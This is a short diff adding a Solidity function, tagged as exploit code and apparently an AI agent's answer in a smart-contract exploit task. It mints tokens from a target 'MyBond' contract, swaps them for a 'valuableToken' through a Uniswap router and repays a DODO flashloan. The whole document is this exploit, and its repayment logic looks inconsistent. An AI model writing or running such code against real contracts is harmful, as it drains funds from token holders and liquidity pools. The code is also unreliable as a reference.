@@ -1,0 +1,31 @@
+```plaintext
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start by minting tokens in MyBond contract
+    IMyBond(target).mint(address(this), amount);
+    
+    uint256 bondBalance = IERC20(target).balanceOf(address(this));
+    console.log("Bond Balance after minting: %s", bondBalance);
+    
+    // Now, we need to sell the BOND tokens for valuableToken
+    address[] memory path = new address[](2);
+    path[0] = target; // BOND token
+    path[1] = address(valuableToken); // Valuable token
+
+    // Swap the BOND tokens for valuableToken using Uniswap router
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        bondBalance,
+        0, // Accept any amount of valuableToken
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    uint256 valuableBalance = valuableToken.balanceOf(address(this));
+    console.log("Valuable Token Balance after swap: %s", valuableBalance);
+
+    // Transfer valuable tokens back to the DODO flashloan provider
+    valuableToken.transfer(flashloanProvider, amount);
+}
+</executeExploitCode>
+```
